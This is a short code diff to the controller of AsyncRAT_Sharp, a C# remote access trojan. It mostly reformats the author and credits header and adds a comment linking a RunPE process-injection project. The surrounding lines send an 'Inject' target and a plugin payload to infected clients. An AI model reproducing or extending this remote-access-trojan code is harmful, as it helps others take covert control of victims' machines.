@@ -17,17 +17,13 @@ using AsyncRAT_Sharp.Helper;
 using System.Security.Cryptography.X509Certificates;
 using System.Collections.Generic;
 
-//       │ Author     : NYAN CAT
-//       │ Name       : AsyncRAT // Simple RAT
+/* 
+       │ Author       : NYAN CAT
+       │ Name         : AsyncRAT  Simple RAT
+       │ Contact Me   : https:github.com/NYAN-x-CAT
 
-//       Contact Me   : https://github.com/NYAN-x-CAT
-
-//       This program Is distributed for educational purposes only.
-
-//       Credits;
-//       Serialization    @ymofen
-//       StreamLibrary    @Dergan
-//       Special Thanks   MaxXor@hf gigajew@hf
+       This program Is distributed for educational purposes only.
+*/
 
 namespace AsyncRAT_Sharp
 {
@@ -467,6 +463,7 @@ namespace AsyncRAT_Sharp
                         {
                             msgpack.ForcePathObject("Inject").AsString = formSend.comboBox2.Text;
                             msgpack.ForcePathObject("Plugin").SetAsBytes(Properties.Resources.Plugin);
+                            // github.com/gigajew/WinXRunPE-x86_x64
                         }
 
                         foreach (ListViewItem itm in listView1.SelectedItems)
